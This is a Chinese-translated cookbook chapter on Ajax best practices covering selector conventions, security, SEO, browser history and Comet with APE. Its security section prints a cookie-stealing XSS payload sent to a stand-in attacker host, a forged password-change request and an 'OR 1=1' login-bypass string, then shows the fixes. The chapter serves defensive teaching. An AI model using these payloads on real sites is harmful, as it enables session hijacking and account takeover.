# 第七章。实施构建 Ajax 网站的最佳实践

在本章中，我们将涵盖：

+   避免 HTML 标记特定编码

+   构建安全的 Ajax 网站

+   构建搜索引擎优化（SEO）友好的 Ajax 网站

+   保留浏览器历史记录或修复浏览器的后退按钮

+   实施彗星 PHP 和 Ajax

完成一件事是一回事，正确完成一件事是另一回事。JavaScript 程序员经常追求最佳实践。随着 UI 编程的流行，它需要更好的组织和实践。在本章中，我们将看到一些常见的最佳实践。

# 避免 HTML 标记特定编码

在无侵入式 JavaScript 方法中，基于选择器的框架（如 jQuery）起着重要作用，HTML 内容与 JavaScript 之间的交互是通过 CSS 选择器完成的。

## 做好准备

假设我们有一个 ID 为`alert`的容器，我们的意图是隐藏它及其相邻元素-也就是隐藏其父元素的所有元素：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="markup-dependent.js">
</script>
<title>Markup dependent jQuery</title>
</head>
<body>
<div>
<a href="#" id="trigger">Hide alert's siblings</a>
</div>
<div id="alert-parent">
<div id="alert-sibling1">
Alert Sibling1
</div>
<div id="alert">
Alert
</div>
<div id="alert-sibling2">
Alert Sibling2
</div>
<div id="alert-sibling3">
Alert Sibling3
</div>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#trigger').click(function(){
$('#alert').parent().hide();
return false;
});
});

```

到目前为止，一切都很好。但是，从代码可维护性的角度来看，这种方法是错误的。

## 如何做...

在 Web 2.0 世界中，网站的设计必须定期更改，以给客户带来新鲜感，UI 设计师必须努力带来新鲜感和更好的可用性。对于前面的标记，让我们假设 UI 设计师在`alert`容器周围添加了额外的边框。CSS 程序员更容易的方法是将`alert`容器包装在另一个容器中以获得边框：

```php
<div id="border-of-alert">
<div id="alert">
Alert
</div>
</div>

```

现在，以前的 JavaScript 功能不像预期的那样工作。CSS 程序员无意中破坏了网站-即使他们能够在`alert`容器周围添加另一个边框。

这说明了 JavaScript 和 CSS 程序员之间协议和标准的必要性-这样他们就不会无意中破坏网站。这可以通过以下方式实现：

1.  通过命名约定引入协议

1.  以不同方式处理情况

## 它是如何工作的...

我们将看到命名约定和不同方法如何帮助我们在这里。

### 通过命名约定引入协议：

当 CSS 程序员更改 HTML 标记时，没有线索表明标记与 JavaScript 功能相关联。因此，命名约定和规则就出现了：

+   所有用于 Ajax 目的的选择器都应该以`js-`为前缀

+   每当标记与 JavaScript 功能相关联时，必须在 PHP 级别进行注释（因为 HTML 注释将暴露给最终用户）

请注意，在与 CSS 程序员达成共识后，我们可以引入更多这样的协议。根据我们引入的协议，HTML 标记将需要更改为：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="no-dependent.js">
</script>
<title>No dependent jQuery - Good</title>
</head>
<body>
<div>
<?php
/*
* Ajax note:
* When js-trigger is clicked, parent and siblings
* of js-alert will hide. "js-alert-parent" is referred
* in JavaScript
*/
?>
<a href="#" id="js-trigger">Hide alert's siblings</a>
</div>
<div id="js-alert-parent">
<div id="alert-sibling1">
Alert Sibling1
</div>
<div id="js-alert">
Alert
</div>
<div id="alert-sibling2">
Alert Sibling2
</div>
<div id="alert-sibling3">
Alert Sibling3
</div>
</div>
</body>
</html>

```

### 处理问题陈述：

如果我们直接引用父元素而不是通过`alert`容器的父元素来隐藏元素，问题的可能性就会降低：

```php
jQuery(document).ready(function($){
$('#js-trigger').click(function(){
$('#js-alert-parent').hide();
return false;
});
});

```

请注意，在这里，我们没有使用`parent()`方法。换句话说，如果我们可以避免`parent()`和`children()`方法对特定标记的使用，我们就相对不太容易使网站崩溃。

## 还有更多...

一般来说，通过代码搜索很容易找到`parent()`和`children()`的用法。但是，如果使用是从未知位置触发的，我们可以修改 jQuery 代码以在 Firebug 控制台中抛出通知。

### console.warn()

为了警告开发人员不要使用它，我们可以查看 jQuery 核心的`parent()`方法，并通过 Firebug 的控制台 API 添加警告：

```php
console.warn('Call to parent(). Warning: It may break when HTML code changes');

```

同样地，我们可以在`children()`方法中添加一个警告：

```php
console.warn('Call to children(). Warning: It may break when HTML code changes');

```

# 构建安全的 Ajax 网站

Ajax 本身并不会产生任何安全风险，但是将网站变成 Ajax 化的方法可能会带来安全风险。这些风险对所有 Web 应用程序都是普遍的。

## 做好准备

我们需要一个安装了开发人员工具的 Web 浏览器。此目的可能的工具包括带有 Firebug 的 Firefox。

## 如何做...

在 Ajax 或非 Ajax 基于 Web 的应用程序中一些常见的安全威胁包括 XSS、SQL 注入和会话劫持。我们将看到它们如何被防止。

1.  **XSS**

XSS 或跨站脚本攻击利用了通过用户输入或某种方式通过 URL 进行网站脚本添加的能力。让我们以允许用户输入其个人简介的流行 Twitter 网站为例。考虑以下输入**Bio**字段：

```php
    <script>alert('XSS');</script>

    ```

如果 Twitter 工程师允许 HTML 执行，或者在显示它们之前没有对条目进行净化，它将提示一个带有文本**XSS**的警报框。在现实世界的情况下，它不会是一个警报框，而可能是恶意活动，比如通过已知 URL 模仿用户输入或窃取用户数据或劫持会话：

```php
    ajaxReq('http://example.com/updateUser.php?passwd=xyz');

    ```

通常，黑客可能无法直接访问`updateUser.php`页面；但是 JavaScript 代码可以完全访问，因为它在当前会话范围内。因此，在这里，我们还必须看看我们的架构：

```php
    document.write('<img src= "http://hacker.example.com/storeHackedData.php?' + document.cookie + '" />';

    ```

有了执行这个恶意代码的能力，黑客可能开始窃取浏览器 cookie。通过 cookie 中的会话 ID，黑客可能劫持用户的会话。

**解决方案：**

XSS 的可能解决方案包括：

+   `strip_tags()`

但是，当我们必须显示 HTML 输入时，这可能不是一个好的解决方案。

+   HTML 净化器库[`htmlpurifier.org/`](http://htmlpurifier.org/)

这个库可以净化 HTML 代码，因此对于 XSS 问题是一个更好的选择。

1.  **会话劫持**

如前所述，黑客可能窃取 cookie 数据，从而获取用户的会话 ID。当黑客通过 cookie 编辑工具设置其浏览器的会话值时，黑客将获得对其他用户会话的访问权限。当服务器或脚本被编程为对所有通信使用相同的会话 ID 时，这种威胁通常很常见。

**解决方案：**

一个可能的快速解决方案是为每个请求生成一个新的会话 ID：

`session_regenerate_id()`

1.  **SQL 注入**

当 SQL 查询根据用户输入来获取一些结果，并且如果用户输入没有得到适当的净化，它就会打开改变 SQL 查询的可能性。例如：

```php
$sql = 'SELECT COUNT(*) FROM users WHERE username=\''.$_POST['username'].'\' AND passwd=\''.$_POST['passwd'].'\'';

```

先前的代码是一个新手的代码，用于验证用户名和密码组合的登录。当发生以下情况时，这种方法会失败得很惨：

```php
$_POST['username'] = 'anything'
$_POST['passwd'] = "anything' OR 1=1"

```

由于`OR 1=1`注入而扩展查询为真：

```php
SELECT COUNT(*) FROM users WHERE username='anything' AND passwd='anything' OR 1=1'

```

**解决方案：**

SQL 注入的唯一防弹解决方案是使用`mysqli`扩展和 PDO 包中提供的准备好的语句：

```php
$sql = 'SELECT COUNT(*) FROM users WHERE username=:username AND passwd=:passwd';
$sth = $dbh->prepare($sql);
$sth->bindParam(':username', $_POST['username'], PDO::PARAM_STR);
$sth->bindParam(':passwd', $_POST['passwd'], PDO::PARAM_STR);
$sth->execute();
$count = $sth->fetchColumn();

```

此外，我们绝不能以明文形式存储密码——我们必须只在数据库中存储加盐哈希。这样，当攻击者以某种方式获得对数据库的访问权限时，我们可以避免密码以明文形式暴露给攻击者。以前，开发人员使用 MD5，然后是 SHA-512 哈希函数，但现在只推荐 bcrypt。这是因为，与其他哈希算法相比，使用 bcrypt 需要更多的时间来破解原始密码。

### Ajax 应用程序的常见错误

**仅客户端决策：**

仅客户端验证、数据绑定和决策是 Ajax 应用程序的常见错误。

仅客户端验证可以很容易地通过禁用 JavaScript 或通过 cURL 直接请求攻击 URL 来破坏。

在购物车中，优惠券的折扣或优惠券验证必须在服务器端完成。例如，如果购物车页面提供优惠券代码的折扣，优惠券代码的有效性必须在服务器端决定。在客户端 JavaScript 中检查优惠券代码的模式是一个不好的方法——用户可以通过查看 JavaScript 代码找出优惠券代码的模式并生成任意数量的优惠券！同样，要支付的最终金额必须在服务器端决定。在下订单时，将最终应付金额保留在隐藏的表单字段或只读输入字段中而不验证应付金额和已付金额是一个不好的方法。很容易通过浏览器扩展（如 Firebug 和 Web Developer 扩展）更改任何表单字段——无论是隐藏的还是只读的。

**解决方案：**

解决方案是始终在服务器端决定而不是在客户端。请记住，即使是包装在 JavaScript 中的任何东西——甚至是神秘的逻辑——也已经暴露给了世界。

**代码架构问题：**

糟糕的架构代码和逻辑不良的代码是一个很大的风险。它们经常暴露意外的数据。

让我们看`http://example.com/user.php?field=email&id=2`。这个脚本被编写来返回用户表中给定`id`的`field`参数引用的值。这个代码架构的意外攻击是能够通过例如`http://example.com/user.php?field=passwd&id=2`来暴露任何字段，包括密码和其他敏感数据。

其他这样的数据暴露可能性是通过 Web 2.0 网站中常见的 Web 服务产生的。当对数据访问没有限制时，用户可以通过 Web 服务窃取数据，即使他们无法在主要网站上访问它。Web 服务通常以 JSON 或 XML 的形式暴露数据，这使得黑客可以轻松地进行窃取。

**解决方案：**

这些问题的解决方案是：

+   **白名单和黑名单请求：**

通过维护一个可以允许或拒绝的请求列表，可以最小化攻击。

+   **请求的限制：**

请求可以通过访问令牌进行速率限制，这样黑客就无法获取更多的数据。

+   **从一开始改进代码架构：**

当架构和框架从一开始就计划针对 Ajax 和 Web 2.0 时，这些问题可以被最小化。显然，每种架构都可能有自己的问题。

## 它是如何工作的...

XSS 是在其他用户查看页面时执行 JavaScript 代码的能力。通过这种方式，攻击者可以执行/触发意外的 URL。此外，攻击者可以窃取会话 cookie 并将其发送到自己的网页。一旦会话 cookie 在攻击者的网页上可用，他或她就可以使用它来劫持会话——而无需知道其他用户的登录详细信息。当 SQL 语句没有得到适当的转义时，原始的预期语句可以通过表单输入进行更改；这被称为 SQL 注入。

以下表格显示了 Web 浏览器在处理从[`www.example.com/page.html`](http://www.example.com/page.html)到不同 URL 的 Ajax 请求时遵循的同源策略：

| URL | 访问 |
| --- | --- |
| `http://subdomain.example.com/page.htm` | 不允许。不同的主机 |
| `http://example.com/page.html` | 不允许。不同的主机 |
| `http://www.example.com:8080/page.html` | 不允许。不同的端口 |
| `"http://www.example.com/dir/page.html"` | 允许。相同的域，协议和端口 |
| `https://www.example.com/page.html` | 不允许。不同的协议 |

在 Web 浏览器中严格遵循政策以避免 Ajax 中的任何直接安全风险。其他可能的安全风险对所有基于 Web 的应用程序都是普遍的，并源于常见的错误。通过适当的安全审计，我们可以避免进一步的风险。

## 还有更多...

通常，通过自动化审核工具来避免安全风险比手动代码检查更容易。有一些开源工具可用于减轻安全问题。

### Exploit-Me

Exploit-Me，网址为[`labs.securitycompass.com/index.php/exploit-me/`](http://labs.securitycompass.com/index.php/exploit-me/)，是一套用于测试 XSS、SQL 注入和访问漏洞的安全相关 Firefox 扩展。这是一种快速审核网站的强大的开源方法。

### WebInspect

HP 的 WebInspect 网络安全审核工具是一种企业审核工具，可扫描许多漏洞和安全向量。网址为[`www.fortify.com/products/web_inspect.html`](http://https://www.fortify.com/products/web_inspect.html)。

### 资源

有一些专门致力于 PHP 安全的网站和工具：

+   PHP 安全联盟，网址为[`phpsec.org/`](http://phpsec.org/)，提供与安全相关的信息。

+   Hardened-PHP 项目的 Suhosin，网址为[`www.hardened-php.org/suhosin/`](http://www.hardened-php.org/suhosin/)，提供了一个补丁，用于修补正常 PHP 构建中可能存在的常见安全漏洞。

+   `mod_security` Apache 模块，网址为[`www.modsecurity.org/`](http://www.modsecurity.org/)，可以保护服务器免受常见的安全攻击。

# 构建 SEO 友好的 Ajax 网站

在互联网上，网站及其商业模式大多依赖于搜索引擎。例如，当用户在 Google 搜索引擎中搜索关键词“图书出版”时，如果 Packt 的网站出现在结果的第一页，这对 Packt 来说将是一个优势，特别是当其商业模式依赖于互联网用户时。

搜索引擎，如谷歌，根据一些因素（称为算法）对结果页面进行排序。这些因素包括页面上的关键词密度、页面的受信任的内部链接、网站的流行度等。所有这些都取决于搜索引擎的蜘蛛能够爬取（或到达）网站的内容的程度。如果网站的索引页面没有链接到网站的内部页面，对内部页面有限制访问，或者没有通过搜索引擎蜘蛛在爬取时查找的`sitemap.xml`文件暴露内部页面，那么这些内容将不会被索引，也无法被搜索到。

依赖搜索引擎结果进行其商业模式的 Web 2.0 网站面临的挑战是，它们必须采用现代的 Ajax 方法来提高最终用户的可用性和留存率，但也需要具有可以被搜索引擎蜘蛛访问和爬取的内容。这就是 Ajax 和 SEO 的作用。

## 准备就绪

我们需要通过一种不显眼的 JavaScript 方法来逐步增强开发搜索引擎友好的网站。下面将解释这种方法和术语。

## 如何做…

采用 SEO 友好的 Ajax 的更容易的方法是逐步增强。这使得页面对任何人都可以访问，包括那些不使用浏览器中的 JavaScript 引擎的人。

为了理解这个概念，让我们来看一个案例，我们有一个带有标签的 Ajax UI，标签是从不同的远程页面加载的：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="script.js">
</script>
<title>Tab - without SEO friendliness</title>
</head>
<body>
<div id="tabs">
<ul>
<li><a id="t1" href="#">Tab 1</a></li>
<li><a id="t2" href="#">Tab 2</a></li>
<li><a id="t3" href="#">Tab 3</a></li>
<li><a id="t4" href="#">Tab 4</a></li>
</ul>
<div id="tab-1">
<p>Tab - 1</p>
</div>
<div id="tab-2">
<p>Tab - 2</p>
</div>
<div id="tab-3">
<p>Tab - 3</p>
</div>
<div id="tab-4">
<p>Tab - 4</p>
</div>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#t1, #t2, #t3, #t4').click(function(){
//extract the clicked element id's number
// as we have single handler for all ids
id=this.id.match(/\d/);
//load respective tab container with
// respective page like /page3.html
$('#tab-'+id).load('/page'+id+'.html');
return false;
});
});

```

如前所述，每个标签页的内容都是从`page1.html、page2.html`等加载的。但是，在检查 HTML 源代码时，无法知道内容加载的 URL；这些 URL 是在 JavaScript 代码中形成的，并且内容是动态加载的。由于大多数搜索引擎爬虫不支持 JavaScript 引擎，并且至少目前无法支持它，它们将错过内容。只有当爬虫可以“查看”内容时，它才能被搜索到。

因此，对于正确的搜索引擎和 SEO 友好性，我们有以下方法：

+   隐匿：

这是通过嗅探用户代理向搜索引擎蜘蛛呈现不同内容的术语。但是，谷歌等搜索引擎会禁止对其内容进行隐匿的网站，以提高搜索引擎质量。

+   `Sitemap.xml:`

在 `Sitemap.xml` 中为所有内部链接提供链接可能会提高搜索引擎的可访问性。`Sitemap.xml` 是向谷歌公开站点链接的标准。但是，这还不够，并且不应该意外地与隐匿混合在一起。

+   内联选项卡：

通过将所有内容倾倒在单个入口页面并使用隐藏和显示，我们可以改善搜索引擎的可访问性。但是，从搜索引擎优化的角度来看，这种解决方案失败了，因为搜索引擎蜘蛛找不到足够的页面。

+   渐进增强：

这是一种网站将被所有浏览器访问的方法。Ajax 增强不会影响非 JavaScript 浏览器的可见性/可访问性。到目前为止，这是最好的方法，当与 `Sitemap.xml` 结合使用时，可以提供更好的搜索引擎可见性。

现在，让我们看看渐进增强方法如何实现选项卡系统。为此，我们将使用 jQuery UI 的选项卡库：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<link rel="stylesheet" href="http://jquery-ui.css" type="text/css" media="all" />
<link rel="stylesheet" href="ui.theme.css" type="text/css" media="all" />
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="jquery-ui.min.js">
</script>
<script type="text/javascript" src="script.js">
</script>
<title>Tab - with SEO friendliness</title>
</head>
<body>
<div id="tabs">
<ul>
<li><a href="page1.html">Tab 1</a></li>
<li><a href="page2.html">Tab 2</a></li>
<li><a href="page3.html">Tab 3</a></li>
<li><a href="page4.html">Tab 4</a></li>
</ul>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#tabs').tabs();
});

```

## 工作原理...

正如之前所指出的，我们并没有隐藏链接，它们始终是可访问的。当 JavaScript 未启用时，单击链接将带您到单独的页面。这就是搜索引擎“查看”网站的方式。搜索引擎将索引具有单独 URL 的页面，例如 `http://example.com/page1.html, http://example.com/page2.html` 等等。

### 注意

Hijax，简单来说，意味着 Hijack + Ajax。这是一种渐进增强技术，其中普通链接被“劫持”，并应用了 Ajax 效果，使网站具有 Ajax 化的感觉。

启用 JavaScript 时，jQuery UI 选项卡会被挂钩；它应用 Hijax 方法，并将链接转换为漂亮的选项卡界面。它还将选项卡链接 Ajax 化，从而在用户单击选项卡时避免页面刷新。

有关 jQuery UI 选项卡的更多信息，请参阅 第三章 中的 *创建选项卡导航* 配方，*使用 jQuery 的有用工具*。

### 谷歌的建议

目前，先前的退化 Ajax 方法是搜索引擎友好的 Ajax 的广泛接受的做法。但是，需要注意的一点是，当用户搜索 `page2.html` 的内容时，搜索引擎将显示链接为 `http://example.com/page2.html`。对于启用 JavaScript 的浏览器和具有 Ajax 经验的普通用户来说，这样的直接链接不会被暴露。因此，为了所有用户都有一致的 URL，谷歌提出了一个解决方案。这种技术，现在被称为 **hashbang**，要求所有 Ajax URL 哈希都以 `!` 为前缀，并提供访问 Ajax 页面内容的机制，如下所示：

+   `http://example.com/index.html#page1` 必须更改为 `http://example.com/index.html#!page1`。

+   当谷歌识别到类似 `http://example.com/index.html#!page1` 的 Ajax URL 时，它将爬取 `http://example.com/index.html?_escaped_fragment_=page1`。这个 URL 必须提供 Ajax 内容。

+   当谷歌在搜索结果页面中列出 URL 时，它将显示 Ajax URL `http://example.com/index.html#!page1`。

通过这种方式，所有用户都可以使用相同的 URL 访问网站。

# 保留浏览器历史或修复浏览器的返回按钮

![保留浏览器历史或修复浏览器的返回按钮](img/3081_07_01.jpg)

根据基本概念，Ajax 允许用户在不刷新整个浏览器的情况下查看页面。随后的浏览器调用通过 XHR 请求路由，并将结果推送到浏览器窗口。在这种情况下，从用户的角度来看，有两个主要的可用性问题：首先，特定内容无法被书签标记 - 因为我们只有一个 URL，可以从中浏览后续页面而不刷新浏览器；其次，用户无法单击返回按钮返回以前的内容 - 因为页面状态在浏览器中没有改变。

## 准备工作

我们需要一个带有 Ajax 组件的浏览器来测试功能，以及一个支持 `window.onhashchange` 事件和 HTML5 的 `window.history.pushState()` 方法来进行比较。

## 如何做...

有许多 jQuery 插件可用于解决此问题。由 Benjamin Arthur Lupton 开发的 jQuery History 插件，可在[`www.balupton.com/projects/jquery-history`](http://www.balupton.com/projects/jquery-history)上获得，通过所有新方法处理历史机制，并为旧版浏览器提供了一个 hack。

考虑以下 HTML 片段，其中包含指向子页面的链接：

```php
<ul>
<li><a href="#/about">About site</a></li>
<li><a href="#/help">Help page</a></li>
</ul>

```

以下是通过 jQuery History 插件处理状态的片段：

```php
jQuery(document).ready(function($){
// bind a handler for all hash/state changes
$.History.bind(function(state){
alert('Current state: ' + state);
});
// bind a handler for state: about
$.History.bind('/about', function(state){
// update UI changes...
});
// Bind a handler for state: help
$.History.bind('/help', function(state){
// update UI changes...
});
});

```

该插件提供其他方法来手动更改状态，并触发状态处理程序。

```php
 $('#about').click(function(){
$.History.go('/about');
});

```

请注意，当用户点击链接`"#/about"`时，状态将更改为`/about`。但是，如果我们希望以编程方式更改状态，例如当用户点击`div`而不是`anchor`时，如前所示，可以使用`go()`方法。

当状态不应对用户可见，但我们需要触发状态处理程序时，`trigger()`方法很有用：

```php
$.History.trigger('/about');

```

## 它是如何工作的...

正如我们所指出的，浏览器不保存 Ajax 请求的状态，因此，后退按钮，浏览器历史记录和书签通常不起作用。一个诱人的快速解决方法是使用以下 JavaScript 代码来更改浏览器中的 URL：

```php
window.location.href = 'new URL';

```

这段代码的问题是它会重新加载浏览器窗口，因此会破坏 Ajax 的目的。

**更简单的 pushState()方法：**

在支持 HTML5 规范的浏览器中，我们可以使用

+   `window.history.pushState()`

+   `window.history.replaceState()`

+   `window.onpopstate`

`window.history.pushState()`允许我们更改浏览器中的 URL，但不会让浏览器重新加载页面。该函数接受三个参数：状态对象，标题和 URL。

```php
window.history.pushState({anything: 'for state'}, 'title', 'page.html');

```

我们还有`window.history.replaceState()`，它将类似于`pushState()`工作，但不会添加新的历史记录条目，它将替换当前 URL。

`window.onpopstate`事件在每次状态更改时触发，即当用户点击后退和前进按钮时。页面重新加载后，`popstate`事件将停止为页面重新加载之前保留的上一个状态触发。为了访问这些状态，我们可以使用`window.history.state`，它可以访问页面重新加载之前的状态。

以下片段显示了如何将这些方法组合在一起以快速解决浏览器历史记录问题：

```php
function handleAjax(responseObj,url){
document.getElementById('content').innerHTML = responseObj.html;
document.title=responseObj.pageTitle;
window.history.pushState({
html:responseObj.html,
pageTitle:responseObj.pageTitle
}, '', url);
}
window.onpopstate=function(e){
if (e.state){
document.getElementById('content').innerHTML = e.state.html;
document.title = e.state.pageTitle;
}
};

```

**onhashchange 方法：**

解决浏览器历史记录问题的主要方法是通过看起来像`#foo`的 URL 哈希。使用哈希的主要动机是，通过`location.hash`更改它不会刷新页面（不像`location.href`），并且对于某些浏览器还会在浏览器历史记录中添加一个条目。但是，当用户点击后退或前进按钮时，没有简单的机制来查看 URL 哈希是否已更改。`window.onhashchange`事件已经在较新的浏览器中引入，并且在哈希更改时将被执行。

`hashchange`事件的可移植性 hack 是通过`setInterval()`方法不断轮询哈希更改。轮询间隔越短，响应性越好，但使用太短的值会影响性能。

**iframe hack 方法：**

一些浏览器，特别是 IE6，在哈希更改时不保存状态。因此，在这里，解决方法是创建一个不可见的`iframe`元素，并更改其`src`属性以跟踪状态。这是因为浏览器跟踪`iframe src`更改的状态。因此，当用户点击浏览器的后退或前进按钮时，他们必须轮询`iframe`的`src`属性以更新 UI。

**结合所有方法：**

为了更好的浏览器兼容性和性能，将所有先前的方法结合起来是至关重要的。jQuery History 插件抽象了所有这些方法，并提供了更好的功能。

# 实现彗星 PHP 和 Ajax

在传统的客户端-服务器通过 HTTP 通信中，对于服务器的每个响应，客户端都会发出请求。换句话说，没有请求就没有响应。

![实现彗星 PHP 和 Ajax](img/3081_07_02.jpg)

Comet、Ajax Push、Reverse Ajax、双向 Web、HTTP 流或 HTTP 服务器推送是用来指代从服务器推送即时数据更改的实现的集体术语。与传统通信不同，在这里，客户端的请求只需一次，所有数据/响应都是从服务器推送的，而不需要客户端进一步的请求调用。

![实现彗星 PHP 和 Ajax](img/3081_07_03.jpg)

通过彗星，我们可以创建 Ajax 聊天和其他实时应用程序。在 HTML5 的 WebSocket API 引入之前，JavaScript 开发人员不得不使用`iframe`、长轮询 Ajax 等方法进行黑客攻击

有许多可用的彗星技术，包括在 Apache Web 服务器上的纯 JavaScript 方法。但是，在性能和方法方面，开源的 APE（Ajax Push Engine）技术看起来很有前途。APE 有两个组件：

1.  APE 服务器

1.  APE JSF（APE JavaScript 框架）

服务器是用 C 编写的，JavaScript 框架基于 Mootools，但也可以与其他框架一起使用，如 jQuery。 APE 服务器模块可以通过 JavaScript 代码进行扩展。它支持传输方法，如长轮询、XHR 流、JSONP 和服务器发送事件。APE 服务器的一些优点包括：

+   基于 Apache 的解决方案无法进行真正的推送

+   APE 可以处理超过 100,000 个用户

+   APE 比基于 Apache 的彗星解决方案更快

+   APE 节省了大量带宽

+   APE 提供的选项比简单的彗星解决方案更多

## 准备就绪

我们的彗星实验需要一个 APE 服务器。建议在 Linux 上安装 APE 服务器，尽管它也可以在带有 VirutalBox 的 Windows 机器上运行。它可以从[`www.ape-project.org/`](http://www.ape-project.org/)下载。

我们将不得不在`Build/uncompressed/apeClientJS.js`中配置 APE 客户端脚本的服务器设置：

```php
//URL for APE JSF...
APE.Config.baseUrl = 'http://example.com/APE_JSF/';
APE.Config.domain = 'auto';
//where APE server is installed...
APE.Config.server = 'ape.example.com';

```

## 如何做...

我们将看到如何进行简单的彗星客户端-服务器交互。我们还将看到如何使用 APE 服务器来通过彗星设置向客户端广播消息。在设置彗星之前，我们需要一些基本的 APE 术语理解。

+   **管道：**

管道是客户端和服务器之间交换数据的通信管道，是通信系统的核心。有两种主要类型的管道：

+   多管道或频道

+   Uni 管道或用户

管道由服务器生成的名为 pubid 的 32 个字符的唯一 ID 标识。

+   **频道：**

频道是可以由服务器或用户直接创建的通信管道。如果用户订阅不存在的频道，则会自动创建频道。每个频道都有一系列属性，并且有两种工作方式：

+   交互式频道

+   非交互式频道

订阅现有交互式频道的用户将收到所有其他订阅该频道的用户列表，并可以通过频道管道直接与它们进行通信。在非交互式频道中，通信是只读的，用户不互相认识，也不能通过频道进行通信。可以通过在频道名称前加上*字符来启动非交互式频道的创建。

+   **用户：**

当用户连接到 APE 时，将为与其他实体进行通信创建一个管道，并为管道分配一个唯一的 sessid。该 ID 帮助服务器识别发送每个命令的用户。用户可以执行允许他们：

+   在管道上为频道或其他用户发布消息

+   订阅/加入频道

+   取消订阅/离开频道

+   创建频道

现在，代码：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="Build/uncompressed/apeClientJS.js">
</script>
<title>Comet with APE</title>
</head>
<body>
<script type="text/javaScript">
var client = new APE.Client();
//Load APE Core
client.load();
//callback, fired when the Core is loaded and ready
// to connect to APE Server
client.addEvent('load', function(){
//Call start function to connect to APE Server
client.core.start({
'name':prompt('Your name?')
});
});
//wrap rest of the code in ready event
client.addEvent('ready', function(){
alert('Client is connected with APE Server');
//join 'myChannel'. If it doesn't exist,
// it will be created
client.core.join('myChannel');
//when channel is created or
// user has joined existing channel...
client.addEvent('multiPipeCreate', function(pipe, options){
//send the message on the pipe
//other users in myChannel can view this message
pipe.send('Test message on myChannel');
alert('Test message sent on myChannel');
});
// on receipt of new message...
client.onRaw('data', function(raw,pipe){
alert('Receiving : '+unescape(raw.data.msg));
});
});
</script>
</body>
</html>

```

上述代码将客户端与服务器连接，并将用户加入名为`myChannel`的频道。当用户加入频道时，它会向频道`myChannel`上的其他用户发送测试消息。请注意，消息是通过频道名称共享的。

为了从服务器端推送一些消息，APE 提供了一种称为`inlinepush`的机制。这个`inlinepush`可以通过调用 APE 服务器的 URL 来触发：

```php
<?php
$APEserver = 'http://ape.example.com/?';
$APEPassword = 'mypassword';
$cmd = array(array(
'cmd' => 'inlinepush',
'params' => array(
'password' => $APEPassword,
'raw' => 'postmsg',
'channel' => 'myChannel',
'data' => array(
'message' => 'My message from PHP'
)
)
));
//trigger request via curl or file_get_contents()...
// request params are in JSON
$data = file_get_contents($APEserver.rawurlencode(json_encode($cmd)));
$data = json_decode($data); // JSON response
if ($data[0]->data->value == 'ok') {
echo 'Message sent!';
} else {
echo 'Error, server response:'. $data;
}
?>

```

## 它是如何工作的...

APE 的底层协议使用 JSON 进行数据传输。从客户端到服务器的连接是通过 APE 的`start()`方法来初始化的。加入频道或创建新频道是通过`join()`方法来初始化的。然后通过`send()`方法将消息传递给频道上其他用户。应该打开多个浏览器窗口或标签页，以查看从一个窗口传输到其他窗口的消息。

APE 的`inlinepush`机制提供了一种在不使用客户端的情况下向频道用户推送消息的方式。这样的推送可以通过调用带有命令的 JSON 编码的 URL 来启动。从 PHP，这样的 URL 可以通过 cURL 调用或简单的`file_get_contents()`调用来触发。
